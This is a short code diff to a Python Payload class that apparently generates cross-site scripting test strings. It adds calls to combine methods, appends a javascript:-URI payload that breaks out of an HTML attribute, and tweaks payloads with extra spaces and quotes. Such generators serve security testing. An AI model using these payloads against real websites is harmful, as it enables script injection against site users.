@@ -14,6 +14,10 @@ class Payload:
         self.src2 = 'src="1"'
         self.space = ' '
         self.message = '``'
+        self.combine1()
+        self.combine2()
+        self.combine3()
+        self.payloads2.append('"><a href=javascript:prompt()')
 
     def addspace(self, value):
         return value + self.space
@@ -66,6 +70,8 @@ class Payload:
                     if i is 1:
                         payload = self.addcomment(payload)
                     payload += self.message
+                    payload += self.space
+                    payload += '"'
                     if self.space not in payload:
                         self.payloads2.append(payload)
                     if self.comment not in payload:
